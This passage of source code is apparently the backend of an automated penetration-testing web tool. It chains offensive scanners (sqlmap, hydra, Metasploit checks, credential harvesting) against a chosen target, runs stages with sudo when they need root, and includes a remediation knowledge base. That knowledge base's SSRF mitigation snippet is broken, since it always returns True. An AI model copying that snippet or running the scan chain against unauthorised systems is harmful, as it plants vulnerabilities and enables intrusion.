        "waf": parse_waf,
        # New parsers
        "sqlmap": parse_sqlmap,
        "nuclei": parse_nuclei,
        "xss_probe": parse_xss_probe,
        "cms_scan": parse_cms_scan,
        "cred_harvest": parse_cred_harvest,
        "subdomains": parse_subdomains,
        "breach_osint": parse_breach_osint,
        "js_leak": parse_js_leak,
        "version_cve": parse_version_cve,
        "tech": parse_tech,
        "cloud": parse_cloud,
        "ad_enum": parse_ad_enum,
        "evidence": parse_evidence,
        "assess": parse_assess,
        # API
        "api_discovery": parse_api_discovery,
        "api_bola": parse_api_bola,
        "api_auth": parse_api_auth,
        "api_injection": parse_api_injection,
        "api_ssrf": parse_api_ssrf,
        "api_mass_assign": parse_api_mass_assign,
        "api_misc": parse_api_misc,
        # Database
        "db_discovery": parse_db_discovery,
        "db_unauth": parse_db_unauth,
        "db_default_creds": parse_db_default_creds,
        "db_sqli": parse_db_sqli,
        "db_nosql": parse_db_nosql,
        "db_privesc": parse_db_privesc,
    }
    if parse_type == "version_gap":
        return parse_version_gap(output, sess)
    fn = parsers.get(parse_type, parse_generic)
    try:
        arity = len(inspect.signature(fn).parameters)
    except (TypeError, ValueError):
        arity = 1
    return fn(output, sess) if arity >= 2 else fn(output)


# ─────────────────────────────────────────────────────────────────────────────
# EXECUTION ENGINE
# ─────────────────────────────────────────────────────────────────────────────
LONG_SUBSTAGE_TIMEOUT = {
    "recon_ports": 1500,
    "vuln_nuclei": 1800,
    "vuln_web_dirs": 1200,
    "deep_cms_scan": 1200,
    "deep_xss_probe": 1200,
    "db_sqlmap": 1800,
    "db_second_order": 1200,
    "ep_hydra": 1800,
    "ep_msf_check": 1200,
    "ep_sqli_verify": 2400,
    "recon_subdomains": 900,
    "recon_osint_passive": 300,
    "recon_breach_osint": 900,
    "recon_js_leak": 480,
    "recon_version_cve": 900,
    "recon_tech": 900,
    "recon_nuclei": 1800,
    "recon_content": 1200,
    "recon_ad_enum": 300,
    "recon_cloud": 300,
    "vuln_evidence": 900,
    "vuln_assess": 60,
}

def execute_substage(sid, sub_id):
    """Safety net: a substage must ALWAYS reach 'completed' (or the chain stalls forever)."""
    try:
        _execute_substage(sid, sub_id)
    except Exception as e:
        print(f"[execute_substage] {sub_id} crashed: {e!r}", flush=True)
        sess = sessions.get(sid)
        if not sess:
            return
        push(sid, "output", {"substage": sub_id, "line": f"[ERROR: substage crashed: {e}]", "type": "error"})
        with sess['lock']:
            if sub_id not in sess['completed']:
                sess['completed'].append(sub_id)
        push(sid, "completed", {"substage": sub_id, "findings": [], "finding_count": 0, "rc": -1})
        _advance_chain(sid, sub_id)


def _run_assessment(sid, sub_id, sub):
    """vuln_assess — in-process CVSS scoring + false-positive triage summary.
    Reads the session's accumulated findings, recomputes CVSS scores and triage
    verdicts (already attached at the choke point), and writes an assessment log
    the analyst can audit. Emits no vulnerability findings itself."""
    sess = sessions.get(sid)
    lines = []
    all_f = []
    for sub_f in list(sess.get('findings', {}).values()):
        all_f.extend(sub_f)
    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
    all_f.sort(key=lambda f: (sev_order.get(f.get('severity'), 9), str(f.get('type'))))
    lines.append(f"CVSS SCORING & FALSE-POSITIVE TRIAGE — {len(all_f)} finding(s) across all substages")
    lines.append(f"{'':=^92}")
    confirmed = toolconf = review = info = 0
    for f in all_f:
        sev = f.get('severity', 'info')
        typ = f.get('type', '')
        v = f.get('triage', {}).get('verdict', 'needs_review')
        cv = f.get('cvss', {})
        if v == 'confirmed': confirmed += 1
        elif v == 'tool-confirmed': toolconf += 1
        elif v == 'info': info += 1
        else: review += 1
        band = cv.get('severity_band', '')
        mismatch = '  <-- BAND MISMATCH (review)' if cv.get('band_mismatch') else ''
        lines.append(f"[{sev.upper():<8}] {typ:<26} cvss={cv.get('base_score','-')} ({band})"
                     f" verdict={v}{mismatch} | {f.get('detail','')[:90]}")
        if cv.get('vector'):
            lines.append(f"{'':>13}vector: {cv['vector']}")
        if f.get('evidence'):
            ev = f['evidence']
            sht = ', '.join(os.path.basename(x) for x in ev.get('screenshots', []))
            pcap = os.path.basename(ev['pcap']) if ev.get('pcap') else '-'
            lines.append(f"{'':>13}evidence: screenshot=[{sht}] pcap=[{pcap}]")
    lines.append("")
    lines.append(f"SUMMARY — confirmed={confirmed} tool-confirmed={toolconf} "
                 f"needs_review={review} informational={info}")
    lines.append(f"Band-mismatch rows above mean the computed CVSS severity disagrees with the label; "
                 f"resolve manually before relying on them.")
    recap = "\n".join(lines)
    outdir = sess.get('outdir', '/tmp')
    try:
        a_file = os.path.join(outdir, 'assessment.txt')
        with open(a_file, 'w') as fh:
            fh.write(recap + "\n")
    except OSError as ex:
        recap += f"\n[warn] could not write assessment file: {ex}"
    sess['assessment'] = recap
    for ln in recap.splitlines():
        push(sid, "output", {"substage": sub_id, "line": ln, "type": "info"})
    sess['completed'].append(sub_id)
    push(sid, "completed", {"substage": sub_id, "findings": [], "finding_count": 0, "rc": 0})
    _advance_chain(sid, sub_id)


def _run_evidence_capture(sid, sub_id, sub):
    """vuln_evidence — capture screenshot + PCAP for each scorable finding that
    has a reachable http endpoint. Evidence is attached to the finding and an
    `evidence_capture` info finding is emitted per capture. Nothing is
    fabricated: a failed capture produces an error string, not a fake file."""
    sess = sessions.get(sid)
    outdir = sess.get('outdir', '/tmp')
    evdir = os.path.join(outdir, 'evidence')
    os.makedirs(evdir, exist_ok=True, mode=0o700)
    captured = []
    all_f = []
    for sub_f in list(sess.get('findings', {}).values()):
        all_f.extend(sub_f)
    cands = [f for f in all_f
             if f.get('severity') in ('critical', 'high', 'medium')
             and f.get('cvss', {}).get('vector') is not None]
    push(sid, "output", {"substage": sub_id,
         "line": f"[evidence capture] {len(cands)} scorable finding(s) eligible (critical/high/medium)", "type": "meta"})
    for f in cands[:8]:
        url = _finding_url(f, sess)
        if not url:
            push(sid, "output", {"substage": sub_id,
                 "line": f"[evidence] no http endpoint for {f.get('type')} — skipped", "type": "meta"})
            continue
        push(sid, "output", {"substage": sub_id, "line": f"[evidence] capturing {f.get('type')} → {url}", "type": "meta"})
        rec = _capture_evidence(f, sess)
        f['evidence'] = rec
        sht = len(rec.get('screenshots', []))
        pcap = rec.get('pcap')
        detail = (f"Evidence for '{f.get('type')}' at {url}: {sht} screenshot(s) "
                  + (f", pcap {os.path.basename(pcap)}" if pcap else ", pcap=error"))
        captured.append({"type": "evidence_capture", "severity": "info",
                         "detail": detail, "path": f.get('path') or url,
                         "command": f"capture evidence for {url}",
                         "evidence": {"screenshots": rec.get('screenshots', []),
                                      "pcap": rec.get('pcap'),
                                      "errors": rec.get('errors', [])}})
        if pcap:
            push(sid, "output", {"substage": sub_id,
                 "line": f"[evidence] {os.path.basename(pcap)} — {os.path.getsize(pcap)} bytes",
                 "type": "info"})
        for e in rec.get('errors', []):
            push(sid, "output", {"substage": sub_id, "line": f"[evidence] {e}", "type": "meta"})
    _normalize_findings(captured, sess, sub_id)
    if not captured:
        captured.append({"type": "evidence_capture", "severity": "info",
                         "detail": "No screenshot/pcap capture run — no scorable finding had a reachable http endpoint",
                         "path": "-", "command": "-"})
        _normalize_findings(captured, sess, sub_id)
    sess['findings'][sub_id] = captured
    sess['completed'].append(sub_id)
    push(sid, "completed", {"substage": sub_id, "findings": captured,
         "finding_count": len(captured), "rc": 0})
    _advance_chain(sid, sub_id)


def _execute_substage(sid, sub_id):
    sess = sessions.get(sid)
    sub = find_sub(sub_id)
    if not sess or not sub:
        return

    push(sid, "running", {"substage": sub_id, "label": sub['label']})

    if sub_id == 'vuln_assess':
        _run_assessment(sid, sub_id, sub)
        return
    if sub_id == 'vuln_evidence':
        _run_evidence_capture(sid, sub_id, sub)
        return

    if PWM_CMD_TIMEOUT > 0:
        sub_timeout = sub.get('timeout') or LONG_SUBSTAGE_TIMEOUT.get(sub_id)
        try:
            timeout = float(sub_timeout) if sub_timeout else PWM_CMD_TIMEOUT
        except (TypeError, ValueError):
            timeout = PWM_CMD_TIMEOUT
        if timeout <= 0:
            timeout = None
    else:
        timeout = None

    cmd_template = sub.get('cmd_template', 'echo "no command"')
    cmd = make_cmd(cmd_template, sess)
    _parts = cmd.strip().split()
    _raw_bin = _parts[0] if _parts else ''
    if _raw_bin == 'sudo' and len(_parts) > 1:
        _raw_bin = _parts[1]
    if _raw_bin == 'timeout':
        # resolve the real tool behind 'timeout -k 5 N <tool> ...' so
        # missing-tool fallback still keys off the actual binary
        for _tok in _parts[1:]:
            if _tok.startswith('-') or re.fullmatch(r'[\d.]+', _tok):
                continue
            _raw_bin = _tok
            break
    skip_check = _raw_bin in ('echo','for','bash','sh','curl','nc','python3','dig',
                               'host','whois','redis-cli','mysql','psql','mysqladmin','mongo',
                               'if','case','while','until','mkdir','cd','export','set','[')
    tool_bin = None if skip_check else _raw_bin
    if 'nmap' in cmd[:30]: tool_bin = 'nmap'

    if tool_bin and not shutil.which(tool_bin):
        fallback = sub.get('fallback_cmd')
        if fallback:
            cmd = make_cmd(fallback, sess)
            push(sid, "output", {"substage": sub_id, "line": f"[{tool_bin} not found → fallback]", "type": "meta"})
        else:
            push(sid, "output", {"substage": sub_id, "line": f"[{tool_bin} not installed — skipped]", "type": "error"})
            sess['completed'].append(sub_id)
            push(sid, "completed", {"substage": sub_id, "findings": [], "finding_count": 0, "rc": -1})
            _advance_chain(sid, sub_id)
            return

    if sub.get('requires_root') and os.geteuid() != 0:
        if _sudo_available():
            cmd = 'sudo -n ' + cmd
            push(sid, "output", {"substage": sub_id, "line": "[requires root → running with sudo]", "type": "meta"})
        else:
            fallback = sub.get('fallback_cmd')
            if fallback:
                cmd = make_cmd(fallback, sess)
                push(sid, "output", {"substage": sub_id, "line": "[requires root → fallback]", "type": "meta"})
            else:
                push(sid, "output", {"substage": sub_id, "line": "[requires root — skipped]", "type": "error"})
                sess['completed'].append(sub_id)
                push(sid, "completed", {"substage": sub_id, "findings": [], "finding_count": 0, "rc": -1})
                _advance_chain(sid, sub_id)
                return

    sess['commands'][sub_id] = cmd
    output, rc = run_command(sid, sub_id, cmd, timeout=timeout)
    sess['outputs'][sub_id] = output

    parse_output = output
    if parse_output.startswith('$ '):
        parse_output = '\n'.join(parse_output.splitlines()[1:])
    findings = dispatch_parser(sub.get('parse', 'generic'), parse_output, sess)
    # Signature scan on output (command echo stripped, negated results excluded)
    for msg, sev in sig_matches(parse_output):
        if not any(f.get('detail') == msg for f in findings):
            findings.append({"type":"signature_match","detail":msg,"severity":sev,
                "path":"detected in output","command":"manual review"})

    _normalize_findings(findings, sess, sub_id)
    sess['findings'][sub_id] = findings

    if sub_id == 'recon_ports':
        port_matches = re.findall(r'(\d+)/tcp\s+open', output)
        if port_matches:
            sess['ports_found'] = ','.join(list(dict.fromkeys(port_matches))[:35])
        for svc_key in VERSION_DB:
            for line in output.splitlines():
                if svc_key in line.lower() and 'open' in line.lower():
                    parts = line.split()
                    if len(parts) >= 4:
                        sess['banner_search'] = ' '.join(parts[3:5])
                    break

    sess['completed'].append(sub_id)
    push(sid, "completed", {
        "substage": sub_id,
        "findings": findings,
        "finding_count": len(findings),
        "rc": rc,
    })
    _advance_chain(sid, sub_id)


def _advance_chain(sid, completed_sub_id):
    sess = sessions.get(sid)
    if not sess: return
    stage = find_stage_for_sub(completed_sub_id)
    if not stage: return
    if stage.get('parallel'):
        stage_sub_ids = [s['id'] for s in stage['substages']]
        done = [i for i in sess['completed'] + sess['skipped'] if i in stage_sub_ids]
        if set(stage_sub_ids).issubset(set(done)):
            push(sid, "stage_complete", {"stage": stage['id']})


# ─────────────────────────────────────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────────────────────────────────────

def _launch_substage(sid, sub_id):
    """Idempotent, thread-safe substage launcher — prevents duplicate runs."""
    sess = sessions.get(sid)
    if not sess or not find_sub(sub_id):
        return False
    with sess['lock']:
        if sub_id in sess['launched'] or sub_id in sess['completed'] or sub_id in sess['skipped']:
            return False
        sess['launched'].add(sub_id)
    threading.Thread(target=execute_substage, args=(sid, sub_id), daemon=True).start()
    return True

@app.route('/')
def index():
    return send_file(os.path.join(BASE_DIR, 'frontend.html'))

@app.route('/api/chain')
def get_chain():
    return jsonify(CHAIN)

@app.route('/api/session/new', methods=['POST'])
def new_session():
    data = request.json or {}
    raw = data.get('target', '').strip()
    if not raw:
        return jsonify({"error": "No target"}), 400
    target = clean_target(raw)
    if not is_valid_target(target):
        return jsonify({"error": "Invalid target. Use a hostname, IPv4 (with optional /CIDR), IPv6 or http(s) URL."}), 400
    sid = str(uuid.uuid4())
    outdir = f"/tmp/pwm_{sid[:8]}"
    os.makedirs(outdir, exist_ok=True, mode=0o700)
    os.chmod(outdir, 0o700)
    sessions[sid] = {
        "sid": sid, "raw_target": raw, "target": target,
        "target_type": detect_target_type(raw),
        "created": datetime.now().isoformat(),
        "outdir": outdir,
        "findings": {}, "outputs": {}, "commands": {},
        "completed": [], "approved": [], "skipped": [], "launched": set(),
        "lock": threading.Lock(),
        "ports_found": "", "banner_search": target,
        "network": infer_network(target), "notes": {},
        "triage_log": {}, "assessment": None,
    }
    output_queues[sid] = queue.Queue(maxsize=20000)
    return jsonify({"sid": sid, "target": target, "target_type": sessions[sid]['target_type']})

@app.route('/api/session/<sid>', methods=['DELETE'])
def delete_session(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    with sess['lock']:
        q = output_queues.get(sid)
        if q is not None:
            q.put({"event": "session_gone", "data": "{}"})
        output_queues.pop(sid, None)
        sessions.pop(sid, None)
    shutil.rmtree(sess['outdir'], ignore_errors=True)
    return jsonify({"ok": True})

@app.route('/api/session/<sid>/triage', methods=['POST'])
def manual_triage(sid):
    """Analyst override of an automated triage verdict. Verdicts: confirmed,
    tool-confirmed, needs_review, info (dismiss). Records the override in the
    session triage log with provenance=analyst."""
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    data = request.json or {}
    sub_id = data.get('substage_id')
    index = data.get('index')
    verdict = data.get('verdict')
    note = data.get('note', '')
    if not sub_id or sub_id not in sess['findings']:
        return jsonify({"error":"unknown substage"}), 400
    try:
        index = int(index)
    except (TypeError, ValueError):
        return jsonify({"error":"invalid index"}), 400
    if verdict not in ('confirmed', 'tool-confirmed', 'needs_review', 'info'):
        return jsonify({"error":"invalid verdict"}), 400
    fs = sess['findings'].get(sub_id, [])
    if index < 0 or index >= len(fs):
        return jsonify({"error":"index out of range"}), 400
    f = fs[index]
    f['triage'] = {"verdict": verdict, "basis": f.get('triage', {}).get('basis', ''),
                   "provenance": "analyst", "note": note,
                   "ts": datetime.now().isoformat()}
    log = sess.get('triage_log', {})
    recs = log.get(sub_id, [])
    if recs and any(r.get('index') == index for r in recs):
        for r in recs:
            if r.get('index') == index:
                r.update({"verdict": verdict, "note": note, "provenance": "analyst",
                          "ts": f['triage']['ts']})
    else:
        recs.append({"index": index, "type": f.get('type'), "severity": f.get('severity'),
                     "verdict": verdict, "basis": f['triage']['basis'], "provenance": "analyst",
                     "note": note, "ts": f['triage']['ts']})
    log[sub_id] = recs
    sess['triage_log'] = log
    return jsonify({"ok": True, "verdict": verdict})

@app.route('/api/session/<sid>/approve', methods=['POST'])
def approve(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    data = request.json or {}
    sub_id = data.get('substage_id')
    note = data.get('note','')
    if not sub_id or not find_sub(sub_id):
        return jsonify({"error":"unknown substage"}), 400
    if sub_id not in sess['approved']:
        sess['approved'].append(sub_id)
    if note:
        sess['notes'][sub_id] = note
    stage = find_stage_for_sub(sub_id)
    if stage and stage.get('parallel'):
        for s_id in [s['id'] for s in stage['substages']]:
            if s_id not in sess['approved']:
                sess['approved'].append(s_id)
            _launch_substage(sid, s_id)
    else:
        _launch_substage(sid, sub_id)
    return jsonify({"ok": True})

@app.route('/api/session/<sid>/approve_stage', methods=['POST'])
def approve_stage(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    data = request.json or {}
    stage_id = data.get('stage_id')
    stage = next((s for s in CHAIN if s['id'] == stage_id), None)
    if not stage: return jsonify({"error":"unknown stage"}), 404
    launched = []
    for sub in stage['substages']:
        if sub['id'] not in sess['approved']:
            sess['approved'].append(sub['id'])
        if _launch_substage(sid, sub['id']):
            launched.append(sub['id'])
    return jsonify({"ok": True, "launched": launched})

@app.route('/api/session/<sid>/skip', methods=['POST'])
def skip(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    sub_id = (request.json or {}).get('substage_id')
    if not sub_id or not find_sub(sub_id):
        return jsonify({"error":"unknown substage"}), 400
    with sess['lock']:
        if sub_id in sess['completed']:
            return jsonify({"ok": True, "note": "already completed"})
        if sub_id not in sess['skipped']:
            sess['skipped'].append(sub_id)
        if sub_id in sess['approved']:
            sess['approved'].remove(sub_id)
        sess['launched'].add(sub_id)
    push(sid, "skipped", {"substage": sub_id})
    _advance_chain(sid, sub_id)
    return jsonify({"ok": True})

@app.route('/api/session/<sid>/stream')
def stream(sid):
    if sid not in output_queues or sid not in sessions:
        return jsonify({"error": "unknown session"}), 404
    def gen():
        yield f"data: {json.dumps({'event':'connected','sid':sid})}\n\n"
        while True:
            try:
                q = output_queues.get(sid)
                if q is None or sid not in sessions:
                    yield "event: session_gone\ndata: {}\n\n"
                    return
                item = q.get(timeout=28)
                yield f"event: {item['event']}\ndata: {item['data']}\n\n"
            except queue.Empty:
                yield ": hb\n\n"
    return Response(gen(), mimetype='text/event-stream',
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

@app.route('/api/session/<sid>/status')
def status(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    return jsonify({
        "completed": sess['completed'], "approved": sess['approved'],
        "skipped": sess['skipped'],
        "finding_counts": {k:len(v) for k,v in sess['findings'].items()},
        "findings": sess['findings'],
        "ports_found": sess.get('ports_found',''),
        "triage_log": sess.get('triage_log', {}),
        "assessment": sess.get('assessment'),
    })

@app.route('/api/session/<sid>/report')
def report(sid):
    sess = sessions.get(sid)
    if not sess: return jsonify({"error":"unknown session"}), 404
    try:
        pdf = build_pdf(sess)
        return send_file(
            pdf, as_attachment=True,
            download_name=f"pwm_report_{sess['target']}_{sid[:8]}.pdf",
            mimetype='application/pdf'
        )
    except Exception as e:
        return jsonify({"error": f"PDF generation failed: {e}"}), 500


@app.after_request
def add_security_headers(resp):
    resp.headers.setdefault('X-Content-Type-Options', 'nosniff')
    resp.headers.setdefault('X-Frame-Options', 'DENY')
    resp.headers.setdefault('Referrer-Policy', 'no-referrer')
    resp.headers.setdefault('X-XSS-Protection', '0')
    if request.path.startswith('/api/'):
        resp.headers.setdefault('Cache-Control', 'no-store')
        resp.headers.setdefault('Content-Security-Policy',
                                "default-src 'none'; frame-ancestors 'none'; base-uri 'none'")
    return resp


@app.errorhandler(400)
@app.errorhandler(404)
@app.errorhandler(405)
@app.errorhandler(413)
def json_error(e):
    return jsonify({"error": getattr(e, 'description', 'request failed')}), e.code or 400


@app.errorhandler(500)
def json_500(e):
    app.logger.exception("Unhandled error")
    return jsonify({"error": "Internal server error"}), 500


# ─────────────────────────────────────────────────────────────────────────────
# REMEDIATION & EXPLOIT KNOWLEDGE BASE
# ─────────────────────────────────────────────────────────────────────────────
REMEDIATION = {
    "open_port":         ("Firewall unused ports with stateful rules. Apply ingress/egress filtering.",
                          "# iptables — block port\niptables -A INPUT -p tcp --dport 8080 -j DROP\n# or ufw\nufw deny 8080"),
    "cve":               ("Apply vendor patch immediately. If unavailable: WAF/IPS virtual patch or upgrade.",
                          "# Check installed version\ndpkg -l <package>\n# Upgrade\napt-get update && apt-get upgrade <package>"),
    "exploit_available": ("Patch to latest stable. Subscribe to vendor security advisories.",
                          "# Ubuntu\napt-get update && apt-get upgrade\n# CentOS/RHEL\nyum update"),
    "web_finding":       ("Remove default files. Disable directory listing. Apply CSP/HSTS/X-Frame-Options.",
                          "# Apache httpd.conf\nServerTokens Prod\nServerSignature Off\nHeader always set X-Frame-Options DENY\nHeader always set X-Content-Type-Options nosniff"),
    "default_cred":      ("Change all default credentials. Implement MFA, account lockout.",
                          "# Linux\npasswd root  # change immediately\n# MySQL\nALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass!1';"),
    "default_cred_http": ("Enforce strong passwords on admin interfaces. Place behind VPN/IP allowlist + MFA.",
                          "# nginx: restrict admin to internal IP\nlocation /admin {\n  allow 192.168.1.0/24;\n  deny all;\n}"),
    "weak_tls":          ("Disable SSLv2/3 and TLS 1.0/1.1. Use TLS 1.2+ with AEAD ciphers.",
                          "# nginx ssl config\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';\nssl_prefer_server_ciphers off;"),
    "weak_cipher":       ("Remove RC4, DES, 3DES, EXPORT, NULL ciphers. Use Mozilla SSL Config Generator.",
                          "# Apache ssl.conf\nSSLProtocol -all +TLSv1.2 +TLSv1.3\nSSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"),
    "heartbleed":        ("Update OpenSSL >= 1.0.1g. Revoke and reissue all TLS certs. Invalidate sessions.",
                          "# Ubuntu\napt-get update && apt-get install --only-upgrade openssl libssl-dev\nopenssl version  # must be >= 1.0.1g"),
    "banner_anomaly":    ("Suppress version banners in server config.",
                          "# Apache\nServerTokens Prod\n# nginx\nserver_tokens off;\n# OpenSSH\n# Edit /etc/ssh/sshd_config\nDebianBanner no"),
    "version_eol":       ("Upgrade to supported version. Subscribe to CVE feed.",
                          "# Check current version and upgrade path\napt-cache policy <package>\napt-get install <package>=<new_version>"),
    "version_outdated":  ("Establish patch SLA. Use automated patching.",
                          "# Auto security updates (Ubuntu)\napt-get install unattended-upgrades\ndpkg-reconfigure unattended-upgrades"),
    "null_session":      ("Disable anonymous RPC. Set RestrictAnonymous=2 in registry.",
                          "# Windows registry (PowerShell)\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RestrictAnonymous -Value 2"),
    "smb_share":         ("Restrict SMB to authenticated users. Enable SMB signing.",
                          "# Disable SMBv1\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\n# Enable signing\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force"),
    "blind_sqli":        ("Use parameterised queries everywhere. Enable WAF SQLi rules.",
                          "# Python (parameterised)\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n\n# PHP (PDO)\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');\n$stmt->execute(['id' => $id]);"),
    "sql_injection":     ("Use parameterised queries. Remove verbose DB errors from responses.",
                          "# Node.js (mysql2)\nconn.execute('SELECT * FROM users WHERE email = ?', [email])\n\n# Java (PreparedStatement)\nPreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\nps.setInt(1, userId);"),
    "auth_timing_oracle":("Constant-time comparison for auth. Return identical responses.",
                          "# Python — constant time compare\nimport hmac\nif not hmac.compare_digest(provided_hash, stored_hash):\n    return 'Invalid credentials'"),
    "timing_anomaly":    ("Audit timing-dependent auth. Jitter response times.",
                          "# Add random jitter to prevent timing attacks\nimport time, random\ntime.sleep(random.uniform(0.1, 0.3))  # add to auth handler"),
    "path_traversal":    ("Validate all file path inputs. Chroot to webroot.",
                          "# Python — safe path join\nimport os\ndef safe_open(base, user_path):\n    full = os.path.realpath(os.path.join(base, user_path))\n    if not full.startswith(base):\n        raise ValueError('Path traversal detected')\n    return open(full)"),
    "host_header_injection":("Whitelist valid Host headers in reverse proxy.",
                              "# nginx\nserver {\n  if ($host !~* ^(yourdomain\\.com|www\\.yourdomain\\.com)$) {\n    return 444;\n  }\n}"),
    "snmp_public":       ("Change community strings. Upgrade to SNMPv3.",
                          "# /etc/snmp/snmpd.conf — remove public, set strong community\nrocommunity StrongSecret 127.0.0.1\n# Or use SNMPv3\ncreateUser myuser SHA 'AuthPass' AES 'PrivPass'"),
    "protocol_vuln":     ("Disable unused protocol features. Restrict to trusted IPs.",
                          "# DNS — disable recursion (BIND)\noptions { recursion no; };\n# NTP — disable monlist\nrestrict default kod nomodify nopeer noquery"),
    "bola_idor":         ("Implement server-side object-level authorisation checks on every request.",
                          "# Python (Flask example)\n@app.route('/api/v1/users/<int:user_id>')\n@login_required\ndef get_user(user_id):\n    if current_user.id != user_id and not current_user.is_admin:\n        abort(403)  # enforce ownership\n    return jsonify(User.query.get_or_404(user_id).to_dict())"),
    "broken_auth":       ("Validate JWTs server-side. Reject alg=none. Use short-lived tokens.",
                          "# Python (PyJWT) — always specify algorithm\nimport jwt\npayload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # never ['none']"),
    "unauth_endpoint":   ("Apply auth middleware to all API routes. Deny-by-default.",
                          "# Express.js — global auth middleware\napp.use('/api', (req, res, next) => {\n  if (!req.headers.authorization) return res.status(401).json({error:'Unauthorized'});\n  next();\n});"),
    "api_endpoint":      ("Restrict Swagger/OpenAPI docs in production. Require auth for actuator.",
                          "# Spring Boot — disable actuator endpoints\nmanagement.endpoints.web.exposure.include=health\nmanagement.endpoint.env.enabled=false"),
    "graphql_introspection":("Disable introspection in production GraphQL.",
                              "# Apollo Server\nconst server = new ApolloServer({\n  introspection: process.env.NODE_ENV !== 'production'\n});"),
    "ssrf":              ("Validate and whitelist URL parameters. Block internal IP ranges.",
                          "# Python — SSRF mitigation\nimport ipaddress, urllib.parse\ndef is_safe_url(url):\n    host = urllib.parse.urlparse(url).hostname\n    try:\n        ip = ipaddress.ip_address(host)\n        if ip.is_private or ip.is_loopback: raise ValueError\n    except: pass\n    return True"),
    "mass_assignment":   ("Use allowlists for fields that users can modify. Never bind raw request body.",
                          "# Django — use explicit field serializer\nclass UserUpdateSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = User\n        fields = ['display_name', 'bio']  # never 'role' or 'is_admin'"),
    "broken_function_auth":("Check function-level permissions separately from object-level.",
                             "# Python decorator for role check\nfrom functools import wraps\ndef require_role(role):\n    def decorator(f):\n        @wraps(f)\n        def wrapper(*args, **kwargs):\n            if current_user.role != role: abort(403)\n            return f(*args, **kwargs)\n        return wrapper\n    return decorator\n\n@app.route('/api/v1/admin/users')\n@require_role('admin')\ndef admin_users(): ..."),
    "api_cors_wildcard": ("Set specific CORS origins. Never use wildcard in production.",
                          "# Express.js\nconst cors = require('cors');\napp.use(cors({\n  origin: ['https://yourdomain.com', 'https://app.yourdomain.com'],\n  credentials: true\n}));"),
    "missing_rate_limit":("Implement rate limiting on all API endpoints.",
                          "# Express.js\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({ windowMs: 15*60*1000, max: 100 });\napp.use('/api/', limiter);"),
    "api_key_exposure":  ("Remove secrets from API responses. Use secrets manager.",
                          "# Use environment variables — never hardcode\nimport os\nAPI_KEY = os.environ['STRIPE_API_KEY']\n\n# .env file (never commit)\nSTRIPE_API_KEY=sk_live_..."),
    "verbose_error":     ("Return generic error messages to clients. Log details server-side only.",
                          "# Express.js global error handler\napp.use((err, req, res, next) => {\n  console.error(err.stack);  // log full error\n  res.status(500).json({ error: 'Internal server error' });  // generic to client\n});"),
    "db_exposed":        ("Bind database to localhost only. Use SSH tunnel or VPN for remote access.",
                          "# MySQL — bind to localhost in /etc/mysql/my.cnf\n[mysqld]\nbind-address = 127.0.0.1\n\n# Redis — /etc/redis/redis.conf\nbind 127.0.0.1"),
    "db_unauth_access":  ("Enable authentication on all database services immediately.",
                          "# Redis — set password in /etc/redis/redis.conf\nrequirepass YourStrongPassword123!\n\n# MongoDB — enable auth in /etc/mongod.conf\nsecurity:\n  authorization: 'enabled'"),
    "db_default_cred":   ("Change all default DB credentials. Enforce password complexity.",
                          "# MySQL\nALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ss!23';\nDELETE FROM mysql.user WHERE User='';\nFLUSH PRIVILEGES;\n\n# PostgreSQL\npsql -c \"ALTER USER postgres PASSWORD 'StrongPass!';\""),
    "nosql_injection":   ("Use query builders. Never pass raw user input to $where or operators.",
                          "# Node.js (mongoose) — sanitise operator injection\nconst mongoSanitize = require('express-mongo-sanitize');\napp.use(mongoSanitize());\n\n// Alternatively: explicitly cast input\nUser.findOne({ username: String(req.body.username) })"),
    "db_excessive_priv": ("Grant minimum required privileges. Revoke FILE/SUPER/GRANT where unnecessary.",
                          "# MySQL — least privilege\nCREATE USER 'appuser'@'localhost' IDENTIFIED BY 'pass';\nGRANT SELECT, INSERT, UPDATE ON mydb.* TO 'appuser'@'localhost';\n-- Never GRANT ALL or FILE privilege to app user"),
    "db_no_audit_log":   ("Enable query logging and audit trail.",
                          "# MySQL — enable general log\n[mysqld]\ngeneral_log = 1\ngeneral_log_file = /var/log/mysql/general.log\nslow_query_log = 1"),
    "db_unencrypted_conn":("Enable TLS for all database connections.",
                            "# MySQL ssl config\n[mysqld]\nssl-ca=/etc/mysql/ca.pem\nssl-cert=/etc/mysql/server-cert.pem\nssl-key=/etc/mysql/server-key.pem\n\n[client]\nssl-mode=REQUIRED"),
    "verbose_db_error":  ("Suppress DB errors in application responses.",
                          "# PHP — disable error display\nini_set('display_errors', '0');\nini_set('log_errors', '1');\n\n# Python/Django\nDEBUG = False  # in production settings.py"),
    "redis_no_auth":     ("Set requirepass in redis.conf and restart.",
                          "# /etc/redis/redis.conf\nrequirepass 'YourStrongRedisPassword!'\n\n# After restart, verify:\nredis-cli AUTH YourStrongRedisPassword!"),
    "redis_data_exposure":("Disable KEYS command. Use SCAN. Encrypt sensitive cached data.",
